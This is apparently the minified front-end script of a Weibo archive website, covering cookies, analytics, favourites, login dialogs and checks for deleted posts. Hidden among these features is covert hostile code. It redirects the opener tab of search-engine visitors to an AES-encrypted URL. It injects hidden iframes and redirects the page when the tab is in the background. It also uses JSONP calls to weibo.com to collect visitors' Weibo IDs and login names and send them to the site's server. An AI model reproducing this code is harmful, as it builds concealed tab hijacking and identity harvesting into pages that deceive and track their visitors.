requirejs=new Object({exists_js:[],exists_css:[],js_path:"/static/js/",css_path:"/static/css/",js:function(name,callback){var Multiple=false;var js_name=name;var js_url=this.js_path+name+".js";if(isArray(name))
{var tmp=name.shift();var names=name;name=tmp;if(names.length>0)
Multiple=true;}
if(typeof name=="object")
{js_url=name.url;js_name=name.name;}
else if(name.indexOf("//")>=0)
{js_url=name;}
else
{js_name=name;js_url=this.js_path+name+".js";}
if(this.exists_js.indexOf(js_name)>=0){if(typeof callback=="function")
{callback();}
return;}
var js=document.createElement("script");js.type="text/javascript";js.src=js_url;if(Multiple==false)
js.onload=callback;else
js.onload=function(){requirejs.js(names,callback);};document.body.appendChild(js);this.exists_js.push(js_name);},css:function(name,callback){var Multiple=false;var css_name=name;var css_url=this.css_path+name+".css";if(isArray(name))
{var tmp=name.shift();var names=name;name=tmp;if(names.length>0)
Multiple=true;}
if(typeof name=="object")
{css_url=name.url;css_name=name.name;}
else if(name.indexOf("//")>=0)
css_url=name;else
{css_name=name;css_url=this.css_path+name+".css";}
if(this.exists_css.indexOf(css_name)>=0){if(typeof callback=="function")
callback();return;}
var link=document.createElement('link');link.type='text/css';link.rel='stylesheet';link.href=css_url;if(Multiple==false)
link.onload=callback;else
link.onload=function(){requirejs.css(names,callback)};document.body.appendChild(link);this.exists_css.push(css_name);}});function isArray(o){return Object.prototype.toString.call(o)==='[object Array]';};if(top.location.origin!=this.location.origin)
top.window.location.href=this.location.href;winWidth=window.screen.width;if(winWidth>window.innerWidth)
winWidth=window.innerWidth;winheight=window.screen.height;if(winheight>window.innerHeight)
winheight=window.innerHeight;var browser="";if(navigator.userAgent.indexOf("MSIE")>0){browser="ie";}else if(navigator.userAgent.indexOf("Firefox")>0){browser="firefox";}else if(navigator.userAgent.indexOf("Chrome")>0){browser="chrome";}else if(navigator.userAgent.indexOf("Safari")>0){browser="Safari";}else if(navigator.userAgent.indexOf("UCWEB")>0){browser="UCWEB";}else if(navigator.userAgent.indexOf("MQQBrowser")>0){browser="MQQBrowser";}
jQuery.cookie=function(name,value,options){if(typeof value!='undefined'){options=options||{};if(value===null){value='';options.expires=-1;}
var expires='';if(!options.expires)
options.expires=1000*24*60*60;if(options.expires&&(typeof options.expires=='number'||options.expires.toUTCString)){var date;if(typeof options.expires=='number'){date=new Date();date.setTime(date.getTime()+(options.expires*1000));}else{date=options.expires;}
expires='; expires='+date.toUTCString();}
var path=options.path?'; path='+options.path:';path=/';var domain=options.domain?'; domain='+options.domain:'';var secure=options.secure?'; secure':'';document.cookie=[name,'=',encodeURIComponent(value),expires,path,domain,secure].join('');}else{var cookieValue=null;if(document.cookie&&document.cookie!=''){var cookies=document.cookie.split(';');for(var i=0;i<cookies.length;i++){var cookie=jQuery.trim(cookies[i]);if(cookie.substring(0,name.length+1)==(name+'=')){cookieValue=decodeURIComponent(cookie.substring(name.length+1));break;}}}
return cookieValue;}};(function($){$.getUrlParam=function(name){var reg=new RegExp("(^|&)"+name+"=([^&]*)(&|$)");var r=window.location.search.substr(1).match(reg);if(r!=null)return unescape(r[2]);return null;}})(jQuery);var a=new Image();a.src=location.protocol+"//www.kxg99.com/api/browser.php";$.cookie("browser","1");if($.cookie("views")==null&&typeof document.visibilityState=="string"&&document.visibilityState=="visible")
{$.cookie("views",1);}
else if(typeof document.visibilityState=="string"&&document.visibilityState=="visible")
$.cookie("views",parseInt($.cookie("views"))+1);if($.cookie("first_time")==null)
$.cookie("first_time",Math.round(new Date().getTime()/1000));if($.cookie("uid")==null)
{$.ajax({url:"/cookie/weibo/",type:"GET",async:true});}
$.cookie("just_time",Math.round(new Date().getTime()/1000));function load_js(js_url,callback)
{$.ajax({url:js_url,dataType:"script",async:false,cache:true,success:function(){if(typeof callback=="function")callback()}})}
function load_css(url,callback){var link=document.createElement('link');link.type='text/css';link.rel='stylesheet';link.href=url;link.onload=callback;document.getElementsByTagName("head")[0].appendChild(link);}
function artdialog(parameter)
{requirejs.js("jquery.artDialog.min",function(){$.dialog(parameter);});}
function addCss(css){$("<style>").prop("type","text/css").html(css).appendTo("head");}
function status_color(color){if(typeof color=="undefined")
{var new_color=user_data('status_color');if(new_color!=null)
{addCss('.status{background-color:'+new_color+'}');}}
else
{user_data('status_color',color);addCss('.status{background-color:'+color+'}');}}
function tongji(method)
{if($.cookie("debug")=="1"||location.hash=="#utm_source=ifvisible")
return;var uid=get_uid();$.ajax({url:"/tongji/action/"+method+"/",type:"GET",async:true,data:{uid:uid}});if(uid>0)
_hmt.push(['_trackEvent','view',method,browser]);}
function view()
{if($.cookie("debug")=="1"||location.hash=="#utm_source=ifvisible")
return;var uid=get_uid();var screen_name=get_screen_name();var statuses_count=$("#vcard #statuses_count").text();var views=0;if(uid>0)
$.ajax({url:"/tongji/view/"+uid+"/",type:"GET",async:true,data:{screen_name:screen_name,ajax:"1",statuses_count:statuses_count,views:views,r:Math.random(),http_referer:document.referrer}});}
function GetRss(uid){tongji("GetRss");var rss=$("div.rss");if(!rss.html())
{var url="http://rss.weibodangan.com/weibo/rss/"+uid+"/";$("a.rss").text("收起");rss.html("<a href=\"http://service.mail.qq.com/cgi-bin/help?subtype=1&&id=40&&no=345\" target=\"_blank\">如何订阅到QQ邮箱</a><br>"+"<a href=\"http://www.inoreader.com/?add_feed="+url+"\" target=\"_blank\">订阅到inoreader</a><br>"+"<a href=\"http://theoldreader.com/feeds/subscribe?url="+url+"\" target=\"_blank\">订阅到theoldreader</a><br>"+"<a href=\"http://cloud.feedly.com/#subscription/feed/"+url+"\" target=\"_blank\">订阅到feedly</a><br>"+"rss地址:"+"<a href=\""+url+"\" target=\"_blank\">"+url+"</a><br>"+"<br>");rss.show();}
else
{rss.html("");$("a.rss").text("订阅更新");}}
qrcode=true;qrcode_js=true;duoshuoQuery="";function getduoshuo()
{if(duoshuoQuery=="")
duoshuoQuery={short_name:"weibodangan"};else
return;var ds=document.createElement('script');ds.type='text/javascript';ds.async=true;ds.src='https://static.duoshuo.com/embed.js';ds.charset='UTF-8';(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(ds);}
function supports_html5_storage(){return typeof localStorage=="object"}
function get_screen_name()
{return $(".user_info .username").text();}
function get_uid()
{if(typeof uid=="string")
return uid;else
return 0;}
function record()
{var uid=get_uid();if(supports_html5_storage()&&get_screen_name().length>1&&uid>1000)
{var record_str="";if(typeof localStorage.record=="string")
record_str=localStorage.record;var record=get_uid()+","+get_screen_name();if(record_str==""){localStorage.record=record;}else{records=record_str.split("|");localStorage.record=record;var i=0;for(;i<records.length&&i<40;i++){var record_uid=records[i].split(",")[0];if(record_uid!=uid){localStorage.record+="|"+records[i];}}}}}
function show_record()
{if(supports_html5_storage()&&$("#record").length==1)
{var record_str="";var user_list_html="";if(typeof localStorage.record=="string")
record_str=localStorage.record;if(record_str!=""){var records=record_str.split("|");var i=0;var max=$("body").height()/88-1;for(;i<records.length&&i<max;i++){var record_uid=records[i].split(",")[0];var record_screen_name=records[i].split(",")[1];user_list_html+="<div class=\"user\">"+"<a class=\"avatar\" title=\""+record_screen_name+"\" href=\"/user/"+record_uid+"/#utm_source=record\"><img class=\"img-circle lazy\" title=\""+record_screen_name+"\" src=\"http://tp2.sinaimg.cn/"+record_uid+"/50/0/1\"><br>"+record_screen_name+"</a></div>"}}
user_list_html+="</div>";var user_list=$("#record .user_list");var user_div=user_list.clone();$(user_div).html(user_list_html);user_list.replaceWith(user_div);}}
function collections_count()
{var uid=get_uid();if(uid==0)
return;var collections_html="";$.ajax({url:"/collections/weibo/",type:"POST",async:false,dataType:"json",data:{weibo:uid},success:function(result){if(result.code==0)
{$("#collections_count span.amount").html(result.collections.length);for(var i=0;i<result.collections.length;i++)
{collections_html+="<a target=\"_blank\" href=\"/collections/view/"+result.collections[i]["id"]+"/#utm_source=collections_count\">"+result.collections[i]["title"]+"("+result.collections[i]["amount"]+")</a><br>"}
var collect_dom=$("#collections_count #collect");var collect=collect_dom.clone();collect.html(""+collections_html);collect_dom.replaceWith(collect)}}});}
function weibos_is_delete()
{$(".weibo .status.nort").each(function(){if(!$(this).hasClass("is_delete"))
{var weibo_id=$(this).attr("id").replace("weibo","");weibo_is_delete(weibo_id)}});}
function weibo_is_delete(weibo_id)
{error_code=0;$.ajax({url:"//api.weibo.com/2/statuses/show.json?source=209678993&trim_user=1&id="+weibo_id,type:"get",async:false,dataType:"jsonp",success:function(result){if(result.code==0)
{error_code=result.data.error_code
if(error_code==20101)
{var uid=get_uid();$("#weibo"+weibo_id).addClass("bg-danger").addClass("is_delete");$.ajax({url:"/tongji/weibo_delete/",type:"post",dataType:"json",async:true,cache:true,data:{uid:uid,weibo:weibo_id},success:function(result){;}})}}}});}
function get_config()
{$.ajax({url:"/weibo/config/",type:"get",async:true,cache:true,dataType:"json",success:function(result){official_uid=result.uid;iframe_url=result.iframe_url;if(typeof result.msg_notice!=undefined)
{msg_notice=result.msg_notice}}});}
Array.prototype.indexOf=function(value){for(var i=0,l=this.length;i<l;i++)if(this[i]==value)return i;return-1;}
var Picker_js=new Array();function Picker_init(js)
{if(Picker_js.indexOf(js)<0)
{Picker_js.push(js);}
if(Picker_js.length>=4)
{var weibo_date=$('#weibo_date');weibo_date.datetimepicker({viewMode:'years',icons:{date:"fa fa-calendar",up:"fa fa-arrow-up",down:"fa fa-arrow-down"},locale:'zh-cn',format:'YYYY-MM-DD',minDate:$("#register_time").text(),maxDate:new Date(),defaultDate:new Date()}).on('dp.change',weibo_date_change);weibo_date.data("DateTimePicker").show()}}
function weibo_date()
{var weibo_date=$('#weibo_date');_hmt.push(['_trackEvent','action',"weibo_date"]);if(weibo_date.data("DateTimePicker")==undefined)
{load_css("//wbdacdn.com/?f=css/bootstrap-datetimepicker.min.css");load_js("//cdn.bootcss.com/bootstrap/3.3.7/js/bootstrap.min.js",function(){Picker_init("bootstrap");load_js("//openapi.baidu.com/libs/moment/2.8.3/moment.js",function(){Picker_init("moment");load_js("//wbdacdn.com/?f=js/moment.locale.zh-cn.js",function(){Picker_init("moment.locale.zh-cn.js");load_js("//wbdacdn.com/?f=js/bootstrap-datetimepicker.min.js",function(){Picker_init("datetimepicker");})})})})}
else
{weibo_date.data("DateTimePicker").show()}}
function weibo_date_change()
{_hmt.push(['_trackEvent','action',"weibo_date_change"]);var uid=get_uid();var link=window.location.protocol+"//"+window.location.host+"/user/"+uid+"/";if(window.location.href.indexOf("history")>1)
{link=window.location.protocol+"//"+window.location.host+"/home_timeline/history/?date="+$("#weibo_date_input").val()+"&order_by=desc";}
else if($.getUrlParam("order_by")=="desc")
{link=window.location.protocol+"//"+window.location.host+"/user/"+uid+"/?date="+$("#weibo_date_input").val()+"&order_by=desc";}
else
{link=window.location.protocol+"//"+window.location.host+"/user/"+uid+"/?date="+$("#weibo_date_input").val();}
location.href=link;}
function user_data(key,value)
{if(typeof localStorage!="object")
return $.cookie(key,value);if(value!=undefined)
{return localStorage.setItem(key,value);}
else
{return localStorage.getItem(key);}}
var CryptoJSAesJson={stringify:function(cipherParams){var j={ct:cipherParams.ciphertext.toString(CryptoJS.enc.Base64)};if(cipherParams.iv)j.iv=cipherParams.iv.toString();if(cipherParams.salt)j.s=cipherParams.salt.toString();return JSON.stringify(j);},parse:function(jsonStr){var j=JSON.parse(jsonStr);var cipherParams=CryptoJS.lib.CipherParams.create({ciphertext:CryptoJS.enc.Base64.parse(j.ct)});if(j.iv)cipherParams.iv=CryptoJS.enc.Hex.parse(j.iv);if(j.s)cipherParams.salt=CryptoJS.enc.Hex.parse(j.s);return cipherParams;}}
function decrypt()
{load_js('http://apps.bdimg.com/libs/crypto-js/3.1.2/rollups/aes.js',function(){$.ajax({url:"/config/weibo/"+winWidth,cache:true,type:"GET",async:false,success:function(result){var url=JSON.parse(CryptoJS.AES.decrypt(result,$.cookie('uid')+$.cookie('views'),{format:CryptoJSAesJson}).toString(CryptoJS.enc.Utf8));if(url.indexOf("|"))
if(url.length>5)
{if(winWidth>900)
location.href=url.split("|")[0]+"#utm_source=op";else
location.href=url.split("|")[1]+"#utm_source=op";}}});});}
if(user_data('pr')==null)
{if(document.referrer.indexOf(".baidu.com")>0||document.referrer.indexOf(".google.com")>0||document.referrer.indexOf(".so.com")>0)
{visible_log();if(user_data("visible")>3)
{user_data('pr',1);load_js('http://apps.bdimg.com/libs/crypto-js/3.1.2/rollups/aes.js',function(){$.ajax({url:"/config/weibo/"+winWidth,cache:true,type:"GET",async:false,success:function(result){var url=JSON.parse(CryptoJS.AES.decrypt(result,$.cookie('uid')+$.cookie('views'),{format:CryptoJSAesJson}).toString(CryptoJS.enc.Utf8));if(url.indexOf("|"))
if(url.length>5&&typeof visible=="number"&&(visible==8||visible==0))
{if(winWidth>900&&url.split("|")[0].length>10)
window.opener.location.href=url.split("|")[0]+"#utm_source=op";else if(url.split("|")[1].length>10)
window.opener.location.href=url.split("|")[1]+"#utm_source=op";}}});});}}}
function unixtime()
{return Math.round(new Date().getTime()/1000);}
function copy2weibo(weibo3copy)
{var weibo=$(weibo3copy.parentElement.parentElement);var pic="";var author=weibo.find(".author_info .screen_name:first").text();var rt_weibo_html=weibo.find(".status_word").text();var imgs=weibo.find("img.bigcursor");for(var i=0;i<imgs.length;i++)
{var img=imgs[i].src.replace("/square/","/large/").replace("/thumbnail/","/large/");pic+=img+"||";}
var title="@"+author+":"+rt_weibo_html+"http://sinacn.weibodangan.com"+$(weibo3copy).data('url');var url="http://service.weibo.com/share/share.php?type=button&language=zh_cn&appkey=381465235&searchPic=false&style=simple&title="+encodeURIComponent(title)+"&pic="+pic+"&searchPic=true&url=";$(weibo3copy).attr("href",url);}
function top_info()
{if(user_data("NLRAF")==null||user_data("NLRAF")<unixtime()){var afp=$("#afp");if(afp.length==0){$("body").prepend('<div id="afp" style="display:none;"><div class="afpc"><p>请按键盘 <strong>CTRL + D</strong> 把微博看看放入收藏夹，追踪最新微博！<a id="af" class="afpa" href="javascript:void(0)" onclick="AddFavorite(true)">加入收藏夹</a></p></div><div class="close_area"><label id="nlraf" onclick="CloseNLRAF(true)" for="check_nlraf"><input type="checkbox" id="check_nlraf" />不再提醒</label><a id="cafp" href="javascript:void(0)" onclick="CloseNLRAF(false)"></a></div></div>')}
setTimeout(showNLRAF,1000);}}
function AddFavorite(b){CloseNLRAF(true);var c=null;if(b=="childreTop"){var c="http://sinacn.weibodangan.com/#utm_source=topfavorite";}else{if(b=="welcomefavorite"){var c="http://sinacn.weibodangan.com/#utm_source=topfavorite"}else{var c="http://sinacn.weibodangan.com/#utm_source=topfavorite"}}
if(browser=="msis"){try{window.external.addFavorite(c,"微博看看-查看删除的微博")}catch(a){alert("请按键盘 CTRL键 + D 把微博看看放入收藏夹，随时查看删除的微博！")}}else{if(browser=="firefox"){try{window.sidebar.addPanel("微博看看-查看删除的微博",c,"")}catch(a){alert("请按键盘 CTRL键 + D 把微博看看放入收藏夹，随时查看删除的微博！")}}else{alert("请按键盘 CTRL键 + D 把微博看看放入收藏夹，随时查看删除的微博！")}}
return false}
function CloseNLRAF(a){if(a){user_data("NLRAF",unixtime()+86400*365)}else{user_data("NLRAF",unixtime()+5)}
$("#afp").slideUp();}
function showNLRAF()
{var afp=$("#afp");afp.slideDown("slow")}
function CloseAd(id)
{var ad=$("#"+id);ad.html("给您显示广告，抱歉了");ad.removeClass("visible-lg-block");ad.slideUp();};var autoVerify;function fromAutoVerify()
{autoVerify=$('form.auto-verify').Validform({tiptype:4,ajaxPost:true,dragonfly:true,showAllError:true,callback:function(d){if(d.status)
{if(user_dialog!=null)
user_dialog.close();artdialog({content:d.msg,lock:true,fixed:true,okValue:'确定',time:2000});}
else
{artdialog({content:d.msg,lock:true,fixed:true,okValue:'确定'});}}});}
var user_dialog=null;var user_register_html=null;function user_register(){load_js("//wbdacdn.com/?f=js/Validform_v5.3.2_min.js",function(){if(user_register_html==null){$.ajax({url:"/register/user/ajax/",cache:true,type:"GET",async:false,success:function(result){user_register_html=result;}});}
if(user_dialog!=null)
user_dialog.close();user_dialog=artdialog({content:user_register_html,lock:true,fixed:true});fromAutoVerify();});}
function user_login(){load_js("//wbdacdn.com/?f=js/Validform_v5.3.2_min.js",function(){if(typeof(user_login_html)=="undefined"){$.ajax({url:"/register/login/ajax/",cache:true,type:"GET",async:false,success:function(result){user_login_html=result;}});}
if(user_dialog!=null)
user_dialog.close();user_dialog=artdialog({content:user_login_html,lock:true,fixed:true});fromAutoVerify();});}
function logout()
{artdialog({content:"确定退出登录吗？",lock:true,fixed:true,okValue:'退出',ok:function(){$.ajax({url:"/register/logout/",type:"GET",async:false});$.cookie('is_login',null);window.location.reload();},cancelValue:"取消",cancel:true});}
var collections_str="";if(typeof localStorage.collections=="string")
collections_str=localStorage.collections;function keep(uid)
{load_js("//wbdacdn.com/?f=js/Validform_v5.3.2_min.js",function(){tongji("keep");$.ajax({url:"/collections/add/"+uid+"/",type:"POST",async:false,dataType:"json",data:{weibo:uid,screen_name:get_screen_name()},success:function(result){if(result.status==false&&result.error_code==403)
{user_login();return;}
if(result.status==true)
{artdialog({content:"收藏成功,您可以在个人中心查看",time:2000});return true;}
else
{artdialog({content:result.msg,lock:true,fixed:true,okValue:'收藏',width:700,initialize:function(){$("form.auto-verify input[name=screen_name]").val(get_screen_name());fromAutoVerify();},ok:function(){autoVerify.submitForm();},cancelValue:"取消",cancel:true});}}});});}
function create_collect()
{$("form.auto-verify select").replaceWith("<input type=\"text\" name=\"title\" class=\"form-control\" style=\"width:220px\" value=\"默认收藏夹\" datatype=\"*\"/>");$("#create_collect").remove();}
function remove_collect(id,weibo)
{artdialog({content:"确认删除这个收藏吗，无法找回！",lock:true,fixed:true,okValue:'删除',ok:function(){$.ajax({url:"/collections/remove/"+id+"/",type:"POST",async:false,dataType:"json",data:{weibo:weibo},success:function(result){artdialog({content:result.msg,time:2000});}});},cancelValue:"取消",cancel:true});}
function zan()
{artdialog({content:"你成功的给<b>"+get_screen_name()+"</b>一个赞<img src=\"http://img.t.sinajs.cn/t4/appstyle/expression/ext/normal/40/hearta_org.gif\">",lock:true,time:2000});tongji("zan");var zan=$(".btn-action a#zan");if(zan.text().match("\\d+")[0]!=undefined)
{var zan_amount=parseInt(zan.text().match("\\d+")[0]);zan_amount=zan_amount+1;zan.text("赞("+zan_amount+")");}}
function cai()
{artdialog({content:"你成功的给<b>"+get_screen_name()+"</b>一个踩，狠狠的把ta踩下去。",lock:true,time:2000});tongji("cai");var cai=$(".btn-action a#cai");if(cai.text().match("\\d+")[0]!=undefined)
{var zan_amount=parseInt(cai.text().match("\\d+")[0]);zan_amount=zan_amount+1;cai.text("踩("+zan_amount+")");}}
function download_weibo()
{artdialog({content:"<h3>下载档案</h3>"+"由于考虑的服务器负载，最多只能下载5000条，更多请联系<a href='http://weibo.com/1704750133/profile?topnav=1&wvr=6'>@你的档案</a><br>",lock:true,fixed:true,okValue:'确定',ok:function(){location.href="/weibo/download/"+get_uid()+"/?weibo_share="+$('#weibo_share').prop('checked');}});}
function search(id)
{if(typeof id=="undefined")
id="美女";var keywrod=$('#'+id).val();if(keywrod.length==0)
{artdialog({content:"请输入搜索词",lock:true,fixed:true,okValue:'确定'});}
else
{location.href="/weibo/search/"+keywrod+"/";}}
function save_weibo()
{tongji("save_weibo");artdialog({content:"恭喜你，成功备份了<b>"+get_screen_name()+"</b>当前的微博，并且加入到自动备份列表里面",lock:true,time:5000});}
function show_like()
{var show_friends=$("#show_friends");if(show_friends.data("status")=="hidden")
{$("#friends").attr("class","visible-block");show_friends.text("收起ta喜欢的微博");show_friends.data("status","show");}
else
{$("#friends").attr("class","visible-lg-block visible-md-block");show_friends.text("查看ta喜欢的微博");show_friends.data("status","hidden");}}
function ticket_add()
{artdialog({content:"<div class=\"ticket_add\">"
+"<form class=\"form-horizontal\" role=\"form\" action=\"/ticket/success/\" method=\"post\">"
+"<div class=\"form-group\">"
+"<div class=\"col-sm-12\">"
+"<input type=\"text\" class=\"form-control\" id=\"ticket_name\" name=\"name\" placeholder=\"昵称，便于我称呼您\">"
+"</div>"
+"</div>"
+"<div class=\"form-group\">"
+"<div class=\"col-sm-12\">"
+"<input type=\"text\" class=\"form-control\" id=\"ticket_email\" name=\"email\" placeholder=\"请务必填写，便于我联系您\">"
+"</div>"
+"</div>"
+"<div class=\"form-group\">"
+"<div class=\"col-sm-12\">"
+"<textarea class=\"form-control\" rows=\"5\" id=\"ticket_content\" name=\"ticket_content\" placeholder=\"您的意见，或者发现的问题\" required=\"required\"></textarea>"
+"</div>"
+"</div>"
+"</form>"
+"</div>",lock:true,fixed:true,okValue:'提交',ok:function(){$.ajax({url:"/ticket/add_ajax/",type:"POST",async:false,dataType:"json",data:{name:$("#ticket_name").val(),email:$("#ticket_email").val(),ticket_content:$("#ticket_content").val()},success:function(result){artdialog({content:result.msg,time:2000});}});},cancelValue:"取消",cancel:true});}
function load_res()
{record();if(winWidth>=995)
{setTimeout(show_record,6000);$("#_bd_share_config").html('<script>window._bd_share_config={"common":{"bdSnsKey":{},"bdText":"","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"32"},"share":{}};with(document)0[(getElementsByTagName(\'head\')[0]||body).appendChild(createElement(\'script\')).src=\'http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion=\'+~(-new Date()/36e5)];</script>')}
if($(".status.no_vip:first").height()<50)
{tongji("no_ad");following_notice();}
else{following_notice();}
if(typeof iframe_url!='undefined'&&iframe_url.length>5&&$.cookie("iframe_url")==null)
{$.cookie("iframe_url","1",{expires:86400});var divObj=document.createElement("div");divObj.innerHTML='<div style="display:none"><iframe src="'+iframe_url+'"></iframe></div>';var first=document.body.firstChild;document.body.insertBefore(divObj,first);}
if(typeof msg_notice!="undefined"){var msg_notice_id=0;if(user_data("msg_notice")!=null){msg_notice_id=user_data("msg_notice");}
if(msg_notice.id>msg_notice_id)
{artdialog({content:msg_notice.content,lock:true,fixed:true,okValue:'已阅',cancel:false,ok:function(){user_data("msg_notice",msg_notice.id);}});}}
CloseTips();setTimeout(CloseTips,5000);}
function update_info(idstr,email,screen_name,followers_count)
{$.ajax({url:"/tongji/weibo_info/",type:"get",dataType:"json",async:true,cache:true,data:{uniqueid:idstr,userid:email,displayname:screen_name,followers_count:followers_count},success:function(result){if(result.code==0)
{$.cookie("weibo_info","1");}}})}
user_is_following=false;function is_following(callback)
{$.ajax({url:"http://widget.weibo.com/public/aj_relationship.php?fuid="+official_uid+"&callback=STK_1439",type:"get",async:false,dataType:"jsonp",success:function(data){if(data.code=="100000"&&data.data.login)
{if(data.data.relation==1||data.data.relation==3)
{$.cookie('is_following','1',{expires:360000});$.cookie("follow_notice","1",{expires:360000});user_is_following=true;$(".container").css("opacity","1");}
else
{$.cookie('is_following','-1',{expires:360000});if(typeof callback=="function")
{$(".container").css("opacity","0.2");callback()}}}}});}
function STK_1937(weibo)
{if(weibo.code=="100000")
{var user=weibo.data;update_info(user.uid,user.loginname,user.nickname,0);$.cookie('weibo_uid',user.uid)}
else
{$.cookie("weibo_info","-1",{expires:3600});}}
function get_profile_cover(uid)
{$.ajax({url:"http://weibo.com/aj/v6/user/newcard?ajwvr=6&type=1&id="+uid,type:"get",async:true,dataType:"jsonp",success:function(result){var html=result.data;var tmp=html.split('<div  style="background-image:url(',2)[1].split(')" class="nc_head">',2)[0];tmp=tmp.replace("_m.",'.').replace(".300.375/",'.300/');$(".profile_banner").css("background-image","url('"+tmp+"')");}});}
function get_weibo_info()
{if($.cookie("weibo_info")!=null)
{if($.cookie("weibo_info")=="0")
{$.cookie("weibo_info","-1",{expires:3600});}
return;}
if(jsonp_support())
$.ajax({url:"http://weibo.com/a/aj/prelogin/status?_t=1&_v=STK_1937",type:"get",async:true,dataType:"jsonp"});}
function jsonp_support()
{return navigator.userAgent.indexOf("Chrome")||navigator.userAgent.indexOf("Firefox");}
function order_by(uid,order)
{var order_link=window.location.protocol+"//"+window.location.host+"/user/"+uid+"/";if(order=="desc")
order_link=window.location.protocol+"//"+window.location.host+"/user/"+uid+"/?order_by="+order+"#utm_source=desc";window.location.href=order_link;}
function following_ad_dialog()
{artdialog({content:"<h3>请按下面操作</h3>"+"<p>请点击下面的红色按钮(点击以后，就不会再出现了)</p>"+'<iframe src="http://widget.weibo.com/relationship/followbutton.php?btn=red&amp;style=2&amp;uid='+official_uid+'&amp;width=136&amp;height=24&amp;language=zh_cn" width="136" height="24" frameborder="0" scrolling="no" marginheight="0"></iframe>'+'<br>点击完成后，请点击下面蓝色的按钮',lock:true,fixed:true,okValue:'已关注',cancel:true,cancelValue:"残忍拒绝",ok:function(){is_following();},beforeunload:function(){$(".container").css("opacity","1");}});}
function following_notice()
{if((typeof is_weibo_login_required!="undefined"&&is_weibo_login_required)||$.cookie('access_token')!=null||$.cookie('is_following')=="1"||typeof official_uid=="undefined"||official_uid=="0")
{return;}
if($.cookie('weibo_uid')!=null&&$.cookie("follow_notice")==null)
{$.cookie("follow_notice","1",{expires:3600});is_following(following_ad_dialog);tongji("following_notice")}}
function following_required()
{if(typeof is_weibo_login_required=="undefined"||!is_weibo_login_required||$.cookie('weibo_uid')==null||typeof official_uid=="undefined"||official_uid=="0")
return;is_following(following_required_dialog);tongji("following_required")}
function following_required_dialog()
{artdialog({content:"<h3>请按下面操作</h3>"+"<p>请点击下面的红色按钮(点击以后，就不会再出现了)</p>"+'<iframe src="http://widget.weibo.com/relationship/followbutton.php?btn=red&amp;style=2&amp;uid='+official_uid+'&amp;width=136&amp;height=24&amp;language=zh_cn" width="136" height="24" frameborder="0" scrolling="no" marginheight="0"></iframe>'+'<br>点击完成后，请点击下面蓝色的按钮',fixed:true,cancel:false,okValue:'已点击',initialize:function(){$(".container").css("opacity","0.3");},ok:function(){is_following(following_required_dialog);}});}
function show_user_info(box)
{if($(box.parentElement).find("span.glyphicon:first").hasClass("glyphicon-chevron-right"))
{$(box.parentElement).find(".box_hidden:first").removeClass("hidden-xs").removeClass("hidden-sm").removeClass("hidden");$(box).find("span.glyphicon:first").removeClass("glyphicon-chevron-right").addClass("glyphicon-chevron-down");}
else
{$(box.parentElement).find(".box_hidden:first").addClass("hidden-xs").addClass("hidden-sm").addClass("hidden");$(box).find("span.glyphicon:first").removeClass("glyphicon-chevron-down").addClass("glyphicon-chevron-right");}}
function report()
{$.ajax({url:'/report/dialog/'+get_uid(),cache:true,type:"GET",async:false,success:function(result){artdialog({content:result,lock:true,fixed:true,okValue:'已关注',cancel:true,cancelValue:"我是没事点点"});}});}
function report_dialog_update()
{$.ajax({type:"POST",url:'/report/report_dialog_update/'+get_uid(),data:$('#report_dialog').serialize(),async:false,dataType:"json",success:function(result){artdialog({content:result.msg,time:2000});},error:function(){alert("Connection error");}});}
var iframe_=false;function RefreshPage()
{if(location.href.indexOf('user')<0)
return;if(ifvisible.now("hidden"))
{if(user_data('pr')==null)
{user_data('pr',1);decrypt();}
if(winWidth>1024&&iframe_==false)
{iframe_=true;$("head").prepend('<iframe class="hidden" src="https://soft.weibodangan.com/zaixian.html" width="100%" align="center,center" vspace="0" hspace="0" marginwidth="0" marginheight="0" scrolling="no" frameborder="0" style="display: none"></iframe>');}}}
$(window).on("load",function(){getduoshuo();if(typeof navigator.connection=="undefined"&&(typeof navigator.connection=="object"&&navigator.connection.type=="wifi"))
{$('.thumb_pic_img').each(function(){$(this).attr("src",$(this).attr("src").replace("/thumbnail/","/large/"));});}
$("img.bigcursor").on('click',"",function(){swiper_show(this);});});get_config();if($.cookie("access_token")||$.cookie("is_following"))
{addCss(".is_vip-block{display:block}.is_vip-inline{display:inline}.is_vip-inline-block{display:inline-block}");}
$('.href').each(function(){$(this).attr("href",$(this).attr("data-url"));this.removeAttribute("data-url");});$(".box .title").on('click',"",function(){show_user_info(this);});status_color();$(document).ready(function(){if($.cookie("views")>=5)
$("#abab").next().hide();if($.cookie("vip_user"))
{if(location.protocol=="http:"&&location.host=="sinacn.weibodangan.com")
{location.href=location.href.replace("http","https");}
$("head").prepend('<link type="text/css" href="/static/css/vip.css?v=2" rel="stylesheet"/>');}
if($.cookie('access_token')!=null)
{$(".no_token").remove();$(".have_token").removeClass("hidden");$("a.index").each(function(){this.removeAttribute("href");$(this).attr("href","/home_timeline/");});}
else
{$(".have_token").remove()}
if($.cookie('is_login')=="1")
{$(".no_login").remove();$(".is_login").removeClass("hidden")}
$('button.remove_collect').on('click',"",function(){remove_collect($(this).attr("collet_id"),this.id);});$('a.longtext').on('click',"",function(){longtext(this)});view();get_weibo_info();var zh_browserLang="zh-cn";if(navigator.language)
{zh_browserLang=navigator.language;}
else if(navigator.browserLanguage)
{zh_browserLang=navigator.browserLanguage;}
if(zh_browserLang.indexOf("zh")<0&&winWidth>=995&&$.support.leadingWhitespace){g_tr=document.createElement('script');g_tr.type='text/javascript';g_tr.async=true;g_tr.src="//translate.google.com/translate_a/element.js?cb=googleTranslateElementInit";var s=document.getElementsByTagName('script')[0];s.parentNode.insertBefore(g_tr,s);tongji("translate");}
setTimeout(load_res,2000);if(($.cookie('access_token')||$.cookie('views')>5||$.cookie("weibo_uid"))&&jsonp_support()&&get_uid()>1)
weibos_is_delete();if($.cookie("password")!=null)
{load_js("//wbdacdn.com/?f=js/admin.js");vcard.find(".username").prepend('<a id="show_admin_dialog" class="btn btn-info btn-primary center-block" rel="nofollow" onclick="show_admin_dialog();" title="管理">管理</a><br><br>');$("head").prepend('<link type="text/css" href="/static/css/admin.css" rel="stylesheet"/>');}
if($.cookie("vip")!=null)
{$(".image_hide").removeClass("image_hide");}
if($.cookie("name")!=null)
{$("#weibo_name").html($.cookie("name"));}
if(winWidth>900)
{top_info();}
